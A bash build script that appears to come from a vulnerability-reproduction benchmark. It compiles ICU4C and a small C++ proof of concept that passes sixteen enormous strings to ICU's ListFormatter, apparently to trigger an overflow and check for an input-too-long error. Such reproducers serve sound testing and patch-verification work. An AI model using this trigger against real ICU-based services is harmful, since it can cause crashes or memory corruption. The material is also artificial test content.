#!/bin/bash -eu
./icu4c/source/runConfigureICU Linux --prefix="$PWD/install" --enable-shared --enable-static --enable-debug
make -j32
make install

cat <<EOF > poc.cpp
#include "unicode/locid.h"
#include "unicode/listformatter.h"
#include "unicode/utypes.h"
#include <cstdlib>
#include <iostream>
#include <vector>

using namespace icu;

int main() {
    UErrorCode status = U_ZERO_ERROR;
    std::unique_ptr<ListFormatter> fmt(ListFormatter::createInstance("en", status));
    std::vector<UnicodeString> inputs;
    UnicodeString input(0xAAAFF00, 0x00000042, 0xAAAFF00);
    for (int32_t i = 0; i < 16; i++) {
        inputs.push_back(input);
    }
    FormattedList result = fmt->formatStringsToValue(
        inputs.data(), static_cast<int32_t>(inputs.size()), status);
    
    if (status != U_INPUT_TOO_LONG_ERROR) {
        std::cout << "Unexpected error: " << u_errorName(status) << std::endl;
    }
    
    return 0;
}
EOF

if [ ! -z "${CXX:-}" ]; then
    ${CXX} ${CXXFLAGS} -I install/include -L install/lib -l icuuc -l icui18n -l icudata -Wl,-rpath,install/lib -o poc poc.cpp
fi